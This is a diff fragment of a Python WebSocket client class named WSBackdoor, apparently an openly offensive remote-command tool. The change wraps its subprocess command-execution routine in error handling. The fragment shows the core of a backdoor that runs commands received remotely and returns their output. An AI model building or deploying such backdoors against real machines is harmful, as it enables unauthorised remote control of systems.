@@ -4,14 +4,19 @@ from ws4py.client.threadedclient import WebSocketClient
 import subprocess
 import optparse
 import os
+from clint.packages.colorama.win32 import STDERR
 
 __author__ = "f47h3r - Chase Schultz"
 
 class WSBackdoor(WebSocketClient):
     
     def __execute__(self, cmd, args=None):
-            proc = subprocess.Popen(cmd, shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-            stdout = proc.stdout.read() + proc.stderr.read()
+            try:
+                proc = subprocess.Popen(cmd, shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                stdout = proc.stdout.read() + proc.stderr.read()
+            except Exception, err:
+                stdout = str(err)
+                print stdout
             return stdout
     
     def changeDir(self, args):
